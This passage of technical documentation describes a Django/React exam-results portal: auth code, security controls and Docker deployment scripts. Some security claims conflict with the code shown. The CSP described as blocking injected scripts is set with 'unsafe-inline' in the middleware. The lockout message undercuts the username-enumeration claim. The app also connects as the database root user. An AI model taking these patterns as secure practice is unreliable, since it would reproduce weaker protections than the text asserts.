is made, and all other 401'd requests wait in the queue and retry with the new
token once the single refresh completes.

### 9.6 AuthContext.jsx and React Context API

React Context provides a way to share state across the component tree without
prop drilling (passing props through every intermediate component).

```jsx
// AuthContext.jsx
import { createContext, useContext, useState, useEffect } from 'react'

const AuthContext = createContext(null)

export function AuthProvider({ children }) {
  const [user, setUser] = useState(null)
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    // Restore session from sessionStorage on mount
    const accessToken = tokenManager.getAccessToken()
    if (accessToken) {
      api.get('/profile/').then(res => {
        setUser(res.data)
      }).catch(() => {
        tokenManager.clearTokens()
      }).finally(() => setLoading(false))
    } else {
      setLoading(false)
    }
  }, [])

  const login = async (username, password) => {
    const { data } = await api.post('/token/', { username, password })
    tokenManager.setTokens(data.access, data.refresh)
    setUser(data.user)
  }

  const logout = async () => {
    await api.post('/logout/', { refresh: tokenManager.getRefreshToken() })
    tokenManager.clearTokens()
    setUser(null)
  }

  return (
    <AuthContext.Provider value={{ user, loading, login, logout }}>
      {children}
    </AuthContext.Provider>
  )
}

export const useAuth = () => useContext(AuthContext)
```

The `useEffect` with an empty dependency array runs once on mount, restoring
the session from `sessionStorage` if tokens are present. The `loading` state
prevents rendering routes before the session check completes — without it,
a page refresh would briefly show the login page before the user is restored,
causing a flash of incorrect content.

### 9.7 tokenManager.js and sessionStorage

```javascript
// tokenManager.js
const tokenManager = {
  getAccessToken:  () => sessionStorage.getItem('access_token'),
  getRefreshToken: () => sessionStorage.getItem('refresh_token'),
  setTokens: (access, refresh) => {
    sessionStorage.setItem('access_token', access)
    if (refresh) sessionStorage.setItem('refresh_token', refresh)
  },
  clearTokens: () => {
    sessionStorage.removeItem('access_token')
    sessionStorage.removeItem('refresh_token')
  }
}
export default tokenManager
```

**`sessionStorage` vs `localStorage`:** `localStorage` persists across browser
tabs and survives browser restarts. `sessionStorage` is scoped to the current
browser tab — closing the tab clears the storage. For an exam portal accessed
on shared computers (university labs), `sessionStorage` is safer: a student
who walks away from a computer without logging out will be automatically logged
out when the browser tab is closed, preventing the next user from accessing
the session.

**Why not httpOnly cookies?** httpOnly cookies cannot be read by JavaScript,
making them immune to XSS-based token theft. However, they require CSRF
protection and more complex cross-origin setup. The portal mitigates XSS risk
through DOMPurify sanitization and a strict Content-Security-Policy header
instead.

### 9.8 Recharts 3.7.0

Recharts is a React charting library built on D3 and SVG. It provides
declarative chart components that integrate naturally with React's data flow.

```jsx
import { BarChart, Bar, XAxis, YAxis, Tooltip, ResponsiveContainer } from 'recharts'

function SGPAChart({ semesterData }) {
  return (
    <ResponsiveContainer width="100%" height={300}>
      <BarChart data={semesterData}>
        <XAxis dataKey="semester" label="Semester" />
        <YAxis domain={[0, 10]} />
        <Tooltip formatter={(value) => value.toFixed(2)} />
        <Bar dataKey="sgpa" fill="#3b82f6" name="SGPA" />
      </BarChart>
    </ResponsiveContainer>
  )
}
```

**`ResponsiveContainer`** makes charts fluid — they resize to fill their
parent container's width, essential for a responsive layout that works on
both desktop monitors and tablet screens.

**Why Recharts over Chart.js?** Chart.js is canvas-based; Recharts is SVG-based.
SVG charts are accessible (screen readers can read SVG text elements), 
infinitely scalable without pixelation, and can be styled with CSS. Chart.js
renders to a pixel canvas, which is faster for large datasets but not needed
for the relatively small semester-count datasets in this portal.

### 9.9 DOMPurify 3.0.6

DOMPurify sanitizes HTML strings by parsing them in a sandboxed DOM environment
and removing any tags or attributes that could execute JavaScript.

```javascript
import DOMPurify from 'dompurify'

// In a circular content rendering component:
const sanitizedContent = DOMPurify.sanitize(circular.content, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'li', 'a'],
  ALLOWED_ATTR: ['href', 'target'],
})

return <div dangerouslySetInnerHTML={{ __html: sanitizedContent }} />
```

**Why is this necessary?** Circular content is authored by admins in a text
editor that may produce HTML. React normally escapes all strings to prevent
XSS, but `dangerouslySetInnerHTML` bypasses that escaping. DOMPurify ensures
that even if a malicious actor injects `<script>` tags through the admin interface,
they are stripped before the HTML is inserted into the DOM.

### 9.10 useIdleTimeout.js

```javascript
import { useEffect, useRef, useCallback } from 'react'

const IDLE_TIMEOUT = 13 * 60 * 1000   // 13 minutes
const WARNING_TIMEOUT = 2 * 60 * 1000  // 2 minute warning

export function useIdleTimeout({ onIdle, onWarning }) {
  const idleTimer = useRef(null)
  const warningTimer = useRef(null)

  const resetTimers = useCallback(() => {
    clearTimeout(idleTimer.current)
    clearTimeout(warningTimer.current)
    warningTimer.current = setTimeout(onWarning, IDLE_TIMEOUT)
    idleTimer.current = setTimeout(onIdle, IDLE_TIMEOUT + WARNING_TIMEOUT)
  }, [onIdle, onWarning])

  useEffect(() => {
    const events = ['mousemove', 'keydown', 'click', 'scroll', 'touchstart']
    events.forEach(e => window.addEventListener(e, resetTimers))
    resetTimers()
    return () => {
      events.forEach(e => window.removeEventListener(e, resetTimers))
      clearTimeout(idleTimer.current)
      clearTimeout(warningTimer.current)
    }
  }, [resetTimers])
}
```

The hook listens to five user interaction event types. Any interaction resets
both timers. After 13 minutes without interaction, the warning modal appears.
After 2 more minutes, `onIdle` is called, which triggers logout via the
`AuthContext.logout()` function.

**`useRef` for timers (not `useState`):** Timer IDs don't need to trigger
re-renders when they change. Using `useRef` avoids unnecessary re-renders
while still maintaining the timer ID across renders for the `clearTimeout` calls.



---

## 10. Security Architecture and Implementation

### 10.1 Defense-in-Depth Philosophy

Security in the SPMVV portal is not achieved by a single mechanism but by
multiple overlapping layers. The "defense-in-depth" principle holds that an
attacker who bypasses one control is still stopped by the next. The portal
implements the following security layers:

1. **Network layer:** Docker container isolation, firewall rules (ufw/iptables)
2. **Transport layer:** HTTPS (TLS) in production, JWT for API authentication
3. **Application layer:** Rate limiting, brute-force lockout, input validation
4. **Data layer:** Parameterized ORM queries, Argon2 password hashing
5. **Client layer:** DOMPurify XSS sanitization, sessionStorage token storage
6. **Audit layer:** Dual logging (app + security logs), audit log table

No single layer is infallible. An attacker who finds an input validation bypass
is still stopped by the parameterized ORM. An attacker who steals a token from
sessionStorage is stopped by the 30-minute access token expiry. This layered
model significantly raises the cost and complexity of a successful attack.

### 10.2 Authentication Security

**JWT Algorithm — HS256:** The portal uses HMAC-SHA256 (HS256) for JWT signing.
HS256 uses a single shared secret key (the Django `SECRET_KEY`) to both sign
and verify tokens. This is appropriate for a monolithic application where the
same server signs and verifies all tokens.

The alternative, RS256, uses a private/public key pair — the private key signs
tokens, and any server with the public key can verify them. RS256 is necessary
in microservice architectures where multiple services need to verify tokens
without sharing a private key. For this single-server portal, HS256 provides
equivalent security with lower complexity.

**SECRET_KEY strength:** Django generates a 50-character `SECRET_KEY` using
a cryptographically secure random function during project creation. This key
must never be committed to version control. In production it is passed via
environment variable (`DJANGO_SECRET_KEY`).

**Token lifetime security rationale:**
- Access tokens (30 min): Short enough to limit exposure if captured in transit
  or via browser history, long enough that normal user sessions don't require
  constant refreshes during active use.
- Refresh tokens (1 day): Allows all-day session persistence for students
  who need extended access during exam periods, while ensuring tokens expire
  at end of day.

**Refresh token rotation:** Each refresh invalidates the old refresh token
and issues a new one. The `BlacklistedToken` model stores invalidated tokens.
The verification flow on `TokenRefreshView`:
1. Decode and validate the presented refresh token
2. Check it is not in the blacklist table
3. Issue a new access token
4. Issue a new refresh token
5. Add the old refresh token to the blacklist
6. Return the new token pair

If an attacker captures a refresh token and tries to use it after the legitimate
user has already rotated it, the blacklist check rejects it.

### 10.3 Brute-Force Protection

The `LoginAttemptMiddleware` in `results/middleware.py` intercepts POST requests
to `/api/token/`:

```python
class LoginAttemptMiddleware:
    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        if request.path == '/api/token/' and request.method == 'POST':
            return self._handle_login(request)
        return self.get_response(request)

    def _handle_login(self, request):
        import json
        try:
            data = json.loads(request.body)
            username = data.get('username', '')
        except (json.JSONDecodeError, UnicodeDecodeError):
            return self.get_response(request)

        try:
            user = CustomUser.objects.get(username=username)
        except CustomUser.DoesNotExist:
            # Record attempt even for non-existent users to prevent enumeration
            LoginAttempt.objects.create(
                username=username,
                ip_address=request.META.get('REMOTE_ADDR'),
                success=False,
                user_agent=request.META.get('HTTP_USER_AGENT', '')
            )
            return self.get_response(request)

        # Check lockout
        if user.lockout_until and timezone.now() < user.lockout_until:
            remaining = (user.lockout_until - timezone.now()).seconds // 60
            return JsonResponse(
                {'error': f'Account locked. Try again in {remaining} minutes.'},
                status=403
            )

        response = self.get_response(request)

        if response.status_code == 200:
            user.failed_login_attempts = 0
            user.lockout_until = None
            user.save(update_fields=['failed_login_attempts', 'lockout_until'])
            LoginAttempt.objects.create(username=username, success=True, ...)
        else:
            user.failed_login_attempts += 1
            if user.failed_login_attempts >= 5:
                user.lockout_until = timezone.now() + timedelta(minutes=30)
            user.save(update_fields=['failed_login_attempts', 'lockout_until'])
            LoginAttempt.objects.create(username=username, success=False, ...)

        return response
```

**Recording attempts for non-existent users:** This prevents username
enumeration — if the portal returned a different error for "user not found" vs
"wrong password," an attacker could use the login endpoint to discover valid
usernames. By recording the attempt and delegating to the normal auth flow,
both cases return the same generic "invalid credentials" message.

**`update_fields` on save:** Using `update_fields=['failed_login_attempts',
'lockout_until']` generates `UPDATE users SET failed_login_attempts=X,
lockout_until=Y WHERE id=Z` rather than updating all fields. This is safer
(avoids accidentally overwriting other fields changed concurrently) and faster.

### 10.4 SQL Injection Prevention

The Django ORM generates parameterized queries for all operations:

```python
# ORM call
results = Result.objects.filter(student=request.user, semester=3)

# Generated SQL (simplified)
# SELECT * FROM results WHERE student_id = %s AND semester = %s
# Parameters: [42, 3]
```

The parameters are passed separately from the SQL string to the database
driver, which handles escaping. This means user-controlled data (like a
semester number from a URL parameter) is never interpolated into the SQL
string, making SQL injection impossible through the ORM.

For the rare cases where raw SQL is used, Django's `connection.execute(sql, params)`
interface still uses parameterized queries:

```python
from django.db import connection
with connection.cursor() as cursor:
    cursor.execute("SELECT * FROM results WHERE semester = %s", [semester])
```

The portal does not use raw SQL — all database access is through the ORM.

### 10.5 Cross-Site Scripting (XSS) Prevention

XSS attacks inject malicious scripts into web pages viewed by other users.
The portal implements multiple XSS mitigations:

1. **React automatic escaping:** React escapes all string values rendered via
   JSX expressions (`{variable}`). `<`, `>`, `&`, `"` and `'` are converted to
   HTML entities. This prevents most reflected and stored XSS attacks.

2. **DOMPurify for rich content:** For content that must render as HTML (circular
   content, notifications), DOMPurify strips dangerous tags and attributes
   before `dangerouslySetInnerHTML` is used.

3. **Content-Security-Policy header:** The `SecurityHeadersMiddleware` adds:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self';
   object-src 'none'; frame-ancestors 'none'
   ```
   This tells the browser to only execute scripts loaded from the same origin.
   Even if an attacker injects a `<script>` tag, the browser will refuse to
   execute it if the source doesn't match the CSP policy.

4. **Backend serializer validation:** All data returned by the API goes through
   DRF serializers which validate field types. A subject name field defined as
   `CharField(max_length=200)` will reject values longer than 200 characters or
   values of the wrong type.

### 10.6 Security Headers

The `SecurityHeadersMiddleware` adds these headers to every response:

```python
class SecurityHeadersMiddleware:
    def __call__(self, request):
        response = self.get_response(request)
        response['X-Content-Type-Options'] = 'nosniff'
        response['X-Frame-Options'] = 'DENY'
        response['X-XSS-Protection'] = '1; mode=block'
        response['Referrer-Policy'] = 'strict-origin-when-cross-origin'
        response['Content-Security-Policy'] = (
            "default-src 'self'; script-src 'self' 'unsafe-inline'; "
            "style-src 'self' 'unsafe-inline'; img-src 'self' data:;"
        )
        return response
```

- **`X-Content-Type-Options: nosniff`** — prevents MIME type sniffing. Without
  this, some browsers would execute a JavaScript file served with `text/plain`
  content type if the content looks like JS. With `nosniff`, browsers strictly
  honor the declared content type.
- **`X-Frame-Options: DENY`** — prevents the page from being embedded in an
  `<iframe>`. This blocks clickjacking attacks where an attacker overlays an
  invisible iframe over their own page to trick users into clicking buttons.
- **`X-XSS-Protection: 1; mode=block`** — enables the browser's built-in XSS
  filter (legacy IE/Chrome mechanism; mostly superseded by CSP but still useful).
- **`Referrer-Policy`** — controls how much URL information is included in the
  `Referer` header when navigating away. `strict-origin-when-cross-origin` sends
  only the origin (not the full path) for cross-origin requests, preventing
  sensitive URL parameters from leaking to third-party sites.

### 10.7 CSRF Protection

Django includes CSRF (Cross-Site Request Forgery) protection by default.
However, for pure REST APIs using JWT in the Authorization header (rather than
session cookies), CSRF protection is less critical. CSRF attacks work by
tricking the browser into making a request to a site where the user is
authenticated via cookie — if authentication is via a header token that the
browser doesn't automatically attach, the attack doesn't apply.

The portal uses `SessionAuthentication` (which does require CSRF protection)
alongside `JWTAuthentication`, so CSRF middleware is kept active.

### 10.8 Rate Limiting Architecture

Rate limiting is implemented at two levels:

**Level 1 — django-ratelimit (application level):**
Applied to the login endpoint (`/api/token/`) with `rate='5/m'` per IP.
This limit is separate from the per-user brute-force lockout.

**Level 2 — User-level lockout (middleware):**
After 5 failed attempts from *any* IP, the specific user account is locked for
30 minutes. This stops distributed brute-force attacks where the attacker
rotates IP addresses to bypass IP-based rate limiting.

The two levels are complementary: IP-based rate limiting stops unsophisticated
attacks quickly; user-level lockout stops sophisticated distributed attacks.

---

## 11. Deployment Architecture

### 11.1 Docker Container Model

The portal runs as three Docker containers connected via a virtual network:

```
┌─────────────────────────────────────────────────────────┐
│                   Docker Host (VM)                       │
│                                                         │
│  ┌──────────────────┐    ┌───────────────────────────┐  │
│  │  spmvv_frontend  │    │     spmvv_backend          │  │
│  │  (Node:alpine)   │    │  (Python:3.11-slim)        │  │
│  │  Nginx + React   │    │  Gunicorn + Django         │  │
│  │  Port: 2026      │    │  Port: 8000                │  │
│  └────────┬─────────┘    └───────────┬───────────────┘  │
│           │                          │                   │
│           └──────────┬───────────────┘                   │
│                      │ spmvv_network (bridge)             │
│                      │                                   │
│           ┌──────────┴──────────┐                        │
│           │     spmvv_db        │                        │
│           │  (MariaDB:10.11)    │                        │
│           │  Port: 3306 (internal only)                  │
│           │  Volume: spmvv_mysql_data                    │
│           └─────────────────────┘                        │
└─────────────────────────────────────────────────────────┘
```

**Container isolation:** Each container runs as a separate process namespace with
its own filesystem, network interface, and process tree. The database container
is not exposed on the host network — only containers on `spmvv_network` can
connect to port 3306. This means the database is inaccessible from the internet
even without firewall rules.

**Named volume `spmvv_mysql_data`:** Docker volumes persist data beyond container
lifecycle. When the database container is destroyed and recreated (during
redeployment), it mounts the same volume and finds its data intact. Without a
named volume, every redeploy would wipe the database.

### 11.2 Multi-Stage Docker Build (Backend)

```dockerfile
# Backend Dockerfile
FROM python:3.11-slim AS builder

WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir --user -r requirements.txt

FROM python:3.11-slim

WORKDIR /app
COPY --from=builder /root/.local /root/.local
COPY . .

ENV PATH=/root/.local/bin:$PATH
ENV PYTHONUNBUFFERED=1
ENV DJANGO_SETTINGS_MODULE=exam_results.settings

RUN chmod +x init.sh
CMD ["./init.sh"]
```

**Multi-stage build rationale:** The `builder` stage installs all Python packages,
including build tools (gcc, Python headers) needed to compile some packages from
source. The final `python:3.11-slim` stage copies only the installed packages
(from `/root/.local`) without the build tools. This reduces the final image size
significantly — build tools that are needed only at build time are not present
at runtime, reducing the attack surface and image download size.

**`PYTHONUNBUFFERED=1`** disables Python's output buffering, ensuring that
`print()` statements and log output appear immediately in `docker logs` rather
than being held in a buffer until the buffer fills or the process exits.

### 11.3 Frontend Nginx Configuration

```nginx
# nginx.conf
server {
    listen 2026;
    root /usr/share/nginx/html;
    index index.html;

    location / {
        try_files $uri $uri/ /index.html;
    }

    location /api/ {
        proxy_pass http://spmvv_backend:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

**`try_files $uri $uri/ /index.html`** is the critical directive for React SPA
routing. When a user navigates directly to `/dashboard/results`:
1. Nginx looks for a file at `/usr/share/nginx/html/dashboard/results` — not found
2. Nginx looks for a directory at `/usr/share/nginx/html/dashboard/results/` — not found
3. Nginx falls back to serving `/index.html`

React Router then picks up the URL from the browser's History API and renders
the correct component. Without this fallback, direct navigation or page refresh
on any route other than `/` would return a 404.

**`proxy_pass http://spmvv_backend:8000`** — Nginx forwards all `/api/` requests
to the backend container using Docker's internal DNS. Within `spmvv_network`,
containers can reach each other by container name. The `proxy_set_header`
directives preserve the original client IP in the forwarded headers, which the
backend reads from `X-Real-IP` or `X-Forwarded-For` for logging and rate limiting.

### 11.4 Frontend Multi-Stage Build

```dockerfile
# frontend/Dockerfile
FROM node:18-alpine AS builder

WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production=false
COPY . .
RUN npm run build

FROM nginx:alpine

COPY --from=builder /app/dist /usr/share/nginx/html
COPY nginx.conf /etc/nginx/conf.d/default.conf

EXPOSE 2026
CMD ["nginx", "-g", "daemon off;"]
```

The Node.js builder stage installs dependencies and runs `vite build`, producing
the optimized static files in `/app/dist`. The Nginx stage copies only these
static files and the nginx configuration — the entire Node.js runtime, npm,
and source code are left behind. The final frontend image is lightweight Nginx
serving pre-built static files.

`npm ci` (clean install) is used instead of `npm install` in Docker builds
because `npm ci` installs exactly the versions specified in `package-lock.json`
rather than resolving latest-compatible versions. This ensures reproducible
builds across environments.

### 11.5 Gunicorn Worker Configuration

```bash
gunicorn exam_results.wsgi:application \
    --bind 0.0.0.0:8000 \
    --workers 4 \
    --worker-class sync \
    --timeout 120 \
    --keep-alive 5 \
    --max-requests 1000 \
    --max-requests-jitter 100
```

**`--max-requests 1000` with `--max-requests-jitter 100`:** After handling 1000
requests, a worker gracefully restarts. This prevents memory leaks from
accumulating indefinitely in long-running workers. The `jitter` (random value
0–100) staggers the restarts — without jitter, all 4 workers would restart
simultaneously after exactly 1000 requests, causing a brief service disruption.

**`--keep-alive 5`:** For 5 seconds after a response, the TCP connection is
kept open for potential reuse (HTTP/1.1 keep-alive). This reduces TCP handshake
overhead for clients making multiple sequential requests.

---

## 12. Deployment Script Walkthrough

The `deploy_docker.sh` script handles both fresh deployments and redeployments
of the portal. It is structured as 10 sequential steps with error checking.

### Step 1 — Detect Deployment Mode

```bash
FRESH_DEPLOY=false
if ! docker ps -a --format '{{.Names}}' | grep -q 'spmvv_db'; then
    FRESH_DEPLOY=true
    echo "[INFO] Fresh deployment detected"
else
    echo "[INFO] Redeployment detected - existing data will be preserved"
fi
```

The script checks if the `spmvv_db` container already exists. If not, it's a
fresh deployment. If yes, it's a redeployment, and the script will back up the
database before stopping the containers.

### Step 2 — Database Backup (Redeployment Only)

```bash
if [ "$FRESH_DEPLOY" = false ]; then
    BACKUP_DIR="/root/spmvv-exam-results/backups"
    mkdir -p "$BACKUP_DIR"
    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    BACKUP_FILE="$BACKUP_DIR/backup_$TIMESTAMP.sql"

    echo "[INFO] Backing up database to $BACKUP_FILE"
    docker exec spmvv_db mysqldump \
        -u root -p"$MYSQL_ROOT_PASSWORD" spmvv_results > "$BACKUP_FILE"

    if [ $? -ne 0 ]; then
        echo "[ERROR] Database backup failed! Aborting deployment."
        exit 1
    fi
fi
```

`docker exec spmvv_db mysqldump` runs `mysqldump` inside the running database
container and redirects output to a host file. The backup is a complete SQL
dump — all `CREATE TABLE` and `INSERT` statements needed to fully restore
the database.

**Aborting on backup failure:** If the backup fails (e.g., wrong password,
container not healthy), the script exits rather than proceeding with a
potentially destructive redeploy. This is a safety guard — a failed backup
followed by a container restart would leave the system in an inconsistent state
with no recovery path.

The timestamp-based filename (`backup_20241215_143022.sql`) ensures each backup
is unique and chronologically sortable. Multiple backups accumulate in the
`backups/` directory, providing a history that can be used to restore to any
past state.

### Step 3 — Stop and Remove Old Containers

```bash
echo "[INFO] Stopping existing containers..."
docker stop spmvv_frontend spmvv_backend spmvv_db 2>/dev/null || true
docker rm spmvv_frontend spmvv_backend spmvv_db 2>/dev/null || true
```

The `2>/dev/null || true` pattern suppresses errors and ensures the script
continues even if containers don't exist (fresh deploy scenario). `docker stop`
sends SIGTERM to the container's main process, allowing graceful shutdown
(Gunicorn handles SIGTERM by completing in-flight requests before exiting).

### Step 4 — Create Docker Network

```bash
docker network create spmvv_network 2>/dev/null || true
```

Creates the bridge network if it doesn't already exist. `|| true` handles the
case where the network exists from a previous deployment — `docker network create`
returns exit code 1 if the network already exists, which would otherwise abort
the script.

### Step 5 — Deploy Database Container

```bash
docker run -d \
    --name spmvv_db \
    --network spmvv_network \
    -e MYSQL_ROOT_PASSWORD="$MYSQL_ROOT_PASSWORD" \
    -e MYSQL_DATABASE=spmvv_results \
    -v spmvv_mysql_data:/var/lib/mysql \
    --restart unless-stopped \
    mariadb:10.11

# Wait for database to be ready
echo "[INFO] Waiting for database to initialize..."
for i in $(seq 1 30); do
    if docker exec spmvv_db mysqladmin ping -u root \
       -p"$MYSQL_ROOT_PASSWORD" --silent 2>/dev/null; then
        echo "[INFO] Database is ready"
        break
    fi
    sleep 2
done
```

The health check loop retries for up to 60 seconds (30 attempts × 2 seconds).
MariaDB typically takes 10–20 seconds to initialize on first run. Without this
wait, the backend container might start and immediately fail to connect to the
database, causing its `migrate` command to fail.

`--restart unless-stopped` is a Docker restart policy: the container
automatically restarts if it crashes or if the Docker daemon restarts (e.g.,
after a system reboot), but does NOT restart if it was explicitly stopped by the
operator.

### Step 6 — Restore Backup (Redeployment Only)

```bash
if [ "$FRESH_DEPLOY" = false ] && [ -n "$BACKUP_FILE" ]; then
    echo "[INFO] Restoring database backup..."
    docker exec -i spmvv_db mysql \
        -u root -p"$MYSQL_ROOT_PASSWORD" spmvv_results < "$BACKUP_FILE"
fi
```

`docker exec -i` (interactive mode) allows stdin to be piped from the host
into the container. The `< "$BACKUP_FILE"` redirects the SQL dump file to
the `mysql` client's stdin, effectively replaying all the SQL statements from
the backup.

### Step 7 — Build and Run Backend Container

```bash
echo "[INFO] Building backend image..."
docker build -t spmvv_backend_image ./backend

docker run -d \
    --name spmvv_backend \
    --network spmvv_network \
    -p 8000:8000 \
    -e DJANGO_SECRET_KEY="$DJANGO_SECRET_KEY" \
    -e DB_HOST=spmvv_db \
    -e DB_NAME=spmvv_results \
    -e DB_USER=root \
    -e DB_PASSWORD="$MYSQL_ROOT_PASSWORD" \
    -e ALLOWED_HOSTS="$ALLOWED_HOSTS" \
    -v /root/spmvv-exam-results/backend/logs:/app/logs \
    --restart unless-stopped \
    spmvv_backend_image
```

**Environment variables for secrets:** `DJANGO_SECRET_KEY` and database
credentials are passed as environment variables rather than being hardcoded
in the Docker image. This follows the 12-Factor App methodology — configuration
that varies between environments (dev, staging, production) is stored in the
environment, not in code.

**Volume mount for logs:** `-v /root/spmvv-exam-results/backend/logs:/app/logs`
maps the host directory to the container path. Log files written by Django to
`/app/logs/` inside the container appear on the host at
`/root/spmvv-exam-results/backend/logs/`. This ensures logs persist across
container restarts and can be viewed without entering the container.

### Step 8 — Build and Run Frontend Container

```bash
docker build -t spmvv_frontend_image ./frontend

docker run -d \
    --name spmvv_frontend \
    --network spmvv_network \
    -p 2026:2026 \
    --restart unless-stopped \
    spmvv_frontend_image
```

The frontend container requires no environment variables at runtime — all
configuration (API base URL, backend hostname) is baked into the static files
by Vite at build time. The Nginx proxy configuration inside the container
directs `/api/` requests to `spmvv_backend:8000` via Docker's internal DNS.

### Step 9 — Configure Firewall

```bash
echo "[INFO] Configuring firewall..."
ufw allow 2026/tcp comment 'SPMVV Frontend'
ufw allow 8000/tcp comment 'SPMVV Backend API'
ufw deny 3306/tcp comment 'Block external DB access'
```

Port 3306 (MariaDB) is explicitly denied. Since the DB container is only on the
internal `spmvv_network` (not published with `-p`), this rule is redundant but
provides defense-in-depth: even if someone accidentally publishes the DB port,
the firewall blocks external access.

### Step 10 — Verify Deployment

```bash
echo "[INFO] Verifying deployment..."
sleep 5

if curl -sf http://localhost:8000/api/health/ > /dev/null; then
    echo "[SUCCESS] Backend is healthy"
else
    echo "[WARNING] Backend health check failed"
fi

if curl -sf http://localhost:2026/ > /dev/null; then
    echo "[SUCCESS] Frontend is accessible"
else
    echo "[WARNING] Frontend health check failed"
fi

echo "[INFO] Container status:"
docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"
```

The health checks use `curl -sf` (silent, fail on HTTP error) to verify that
both services are responding. The final `docker ps` output gives a visual
confirmation of all running containers with their status and port mappings.

### The `init.sh` Backend Startup Script

```bash
#!/bin/bash
set -e  # Exit on any error

echo "[INFO] Running database migrations..."
python manage.py migrate --noinput

echo "[INFO] Creating default admin..."
python manage.py init_admin

echo "[INFO] Collecting static files..."
python manage.py collectstatic --noinput

echo "[INFO] Starting Gunicorn..."
exec gunicorn exam_results.wsgi:application \
    --bind 0.0.0.0:8000 \
    --workers 4 \
    --timeout 120
```

`set -e` causes the script to exit immediately if any command fails. If
`migrate` fails (e.g., database not ready), the script exits and Docker marks
the container as stopped. Without `set -e`, a failed migration would be silently
ignored and Gunicorn would start serving an application with an out-of-date
schema.

`exec gunicorn` replaces the shell process with the Gunicorn process (rather than
running Gunicorn as a child process). This means Gunicorn becomes PID 1 in the
container, which is important because Docker sends SIGTERM to PID 1 when stopping
a container. If the shell were PID 1 and Gunicorn a child, SIGTERM would go to
the shell, which might not forward it to Gunicorn, causing ungraceful shutdown.



---

## 13. Project File Structure and Purpose of Each File

```
spmvv-exam-results/
│
├── deploy_docker.sh          # Main Linux deployment script (10-step)
├── deploy.bat                # Windows CMD deployment script
├── deploy_windows.bat        # Alternative Windows CMD deployment
├── deploy_windows.ps1        # PowerShell deployment script
│
├── backups/                  # Timestamped MySQL dump files (auto-created)
│   └── backup_YYYYMMDD_HHMMSS.sql
│
├── backend/
│   ├── Dockerfile            # Multi-stage Python build
│   ├── init.sh               # Container startup: migrate → init_admin →
│   │                         #   collectstatic → gunicorn
│   ├── requirements.txt      # Python package manifest with pinned versions
│   ├── manage.py             # Django management command entry point
│   │
│   ├── exam_results/         # Django project package
│   │   ├── __init__.py
│   │   ├── settings.py       # All configuration: DB, JWT, CORS, logging,
│   │   │                     #   installed apps, middleware order
│   │   ├── urls.py           # Root URL dispatcher: routes /api/* to app
│   │   └── wsgi.py           # WSGI application callable for Gunicorn
│   │
│   ├── results/              # Main Django application
│   │   ├── __init__.py
│   │   ├── admin.py          # Django admin site model registrations
│   │   ├── apps.py           # AppConfig (app name and label)
│   │   ├── models.py         # All 13 database models
│   │   ├── serializers.py    # DRF serializers for all models
│   │   ├── views.py          # All API view classes and functions (~1500 lines)
│   │   ├── urls.py           # App-level URL patterns for all endpoints
│   │   ├── middleware.py     # LoginAttemptMiddleware + SecurityHeadersMiddleware
│   │   ├── permissions.py    # Custom DRF permission classes
│   │   ├── excel_handler.py  # Excel result file parsing and DB insertion
│   │   ├── hall_ticket_pdf.py # ReportLab PDF generation for hall tickets
│   │   ├── hall_ticket_views.py # Hall ticket lifecycle API views
│   │   └── management/
│   │       └── commands/
│   │           └── init_admin.py  # Creates default admin on first boot
│   │
│   ├── migrations/           # 16 Django migration files (schema history)
│   │   ├── 0001_initial.py
│   │   ├── 0002_add_branch_field.py
│   │   └── ... (16 total)
│   │
│   └── logs/                 # Mounted from host; persists across restarts
│       ├── app.log           # INFO+ application events
│       └── security.log      # WARNING+ security events
│
└── frontend/
    ├── Dockerfile            # Multi-stage Node build → Nginx
    ├── nginx.conf            # SPA fallback routing + /api/ proxy
    ├── package.json          # npm package manifest
    ├── package-lock.json     # Exact dependency lock file
    ├── vite.config.js        # Vite build config with manual chunks
    ├── tailwind.config.js    # Tailwind content paths and theme extensions
    ├── postcss.config.js     # PostCSS plugins (required by Tailwind)
    ├── index.html            # HTML entry point with <div id="root">
    │
    └── src/
        ├── main.jsx          # ReactDOM.createRoot + App mount
        ├── App.jsx           # Root component with Router and AuthProvider
        │
        ├── context/
        │   └── AuthContext.jsx   # Global auth state: user, login(), logout()
        │
        ├── hooks/
        │   ├── useIdleTimeout.js  # 15-min idle logout timer logic
        │   └── useEscapeKey.js    # Closes modals on ESC key press
        │
        ├── services/
        │   └── api.js            # Axios instance with JWT interceptors
        │
        ├── utils/
        │   ├── tokenManager.js   # sessionStorage token read/write/clear
        │   └── validation.js     # Client-side form validation functions
        │
        ├── components/
        │   ├── ProtectedRoute.jsx    # Guards auth-required routes
        │   ├── IdleWarningModal.jsx  # Shows 2-min countdown before logout
        │   ├── Navbar.jsx            # Top navigation bar
        │   ├── LoadingSpinner.jsx    # Reusable loading indicator
        │   └── ErrorMessage.jsx      # Reusable error display component
        │
        ├── pages/
        │   ├── LoginPage.jsx
        │   ├── RegisterPage.jsx
        │   ├── StudentDashboard.jsx
        │   └── AdminDashboard.jsx
        │
        └── features/             # Feature-specific component modules
            ├── results/
            │   ├── ResultsView.jsx
            │   └── SGPACalculator.jsx
            ├── statistics/
            │   └── StatisticsView.jsx
            ├── notifications/
            │   └── NotificationsView.jsx
            ├── hallticket/
            │   ├── HallTicketDownload.jsx
            │   └── HallTicketManager.jsx
            └── admin/
                ├── UploadResults.jsx
                ├── ManageUsers.jsx
                ├── CircularManager.jsx
                └── AuditLogView.jsx
```

---

## 14. API Endpoint Reference

All endpoints are prefixed with `/api/`. Authentication is via
`Authorization: Bearer <access_token>` header unless marked as public.

### Authentication Endpoints

| Method | Path                  | Auth Required | Description                                |
|--------|-----------------------|---------------|--------------------------------------------|
| POST   | `/token/`             | No            | Login: returns access + refresh token pair |
| POST   | `/token/refresh/`     | No            | Exchange refresh token for new access token|
| POST   | `/logout/`            | Yes           | Blacklists refresh token, invalidates session |
| POST   | `/register/`          | No            | Create new student account                 |

**POST `/token/` request body:**
```json
{ "username": "21001234", "password": "secret123" }
```
**Response (200):**
```json
{
